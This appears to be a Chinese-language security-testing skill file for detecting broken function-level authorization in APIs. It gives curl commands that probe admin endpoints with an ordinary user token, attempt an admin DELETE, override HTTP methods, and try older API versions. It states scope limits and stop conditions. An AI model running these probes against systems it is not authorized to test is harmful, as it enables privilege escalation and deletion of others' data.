---
name: bfla
description: 检测 API 中的功能级授权破坏（BFLA），验证普通用户是否能通过直接调用管理端点或操纵 HTTP 方法来执行管理员功能。
category: api
source: xalgorix
tags:
  - BFLA
  - API 安全
  - 授权缺陷
  - OWASP API5:2023
required_tools:
  - curl
---

# BFLA 功能级授权缺陷检测

## 适用场景

- API 存在不同角色（匿名、普通用户、管理员）。
- 需要验证管理端点是否被正确保护。
- HTTP 方法级别的授权检查可能缺失。

## 授权边界

- 仅测试自己的账号在不同权限下的行为。
- 不利用管理员功能操作其他用户数据。

## 前置条件

- 至少两个不同角色的测试账号。
- 已收集管理相关端点路径。

## 执行步骤

### 步骤 1：管理端点发现

```bash
# 常见管理路径
for path in admin dashboard manage users config settings; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/$path" \
    -H "Authorization: Bearer <user_token>")
  [ "$code" != "404" ] && echo "$path: HTTP $code"
done
```

### 步骤 2：角色越权测试

```bash
# 用普通用户 Token 访问管理端点
curl -s "https://<target>/api/admin/users" \
  -H "Authorization: Bearer <user_token>"

# 尝试管理操作
curl -X DELETE "https://<target>/api/admin/users/123" \
  -H "Authorization: Bearer <user_token>"
```

### 步骤 3：HTTP 方法操纵

```bash
# 如果 GET 被限制，尝试其他方法
curl -X POST "https://<target>/api/users" \
  -H "Authorization: Bearer <user_token>"

# 覆盖方法头
curl -X GET "https://<target>/api/users" \
  -H "Authorization: Bearer <user_token>" \
  -H "X-HTTP-Method-Override: DELETE"
```

### 步骤 4：API 版本绕过

```bash
# 旧版本可能没有正确授权
curl -s "https://<target>/api/v1/admin/users" \
  -H "Authorization: Bearer <user_token>"

curl -s "https://<target>/api/internal/users" \
  -H "Authorization: Bearer <user_token>"
```

## 停止条件

- 普通用户可执行管理操作（删除用户、修改配置）时立即停止并报告。
- 不通过 BFLA 对真实数据进行破坏性操作。

## 输出格式

- 可访问的管理端点列表。
- 越权成功的方法和操作。
- API 版本差异（旧版本授权缺失）。

## 验收标准

1. 测试了常见管理路径的访问控制。
2. 尝试了 HTTP 方法覆盖绕过。
3. 测试了旧 API 版本的授权。
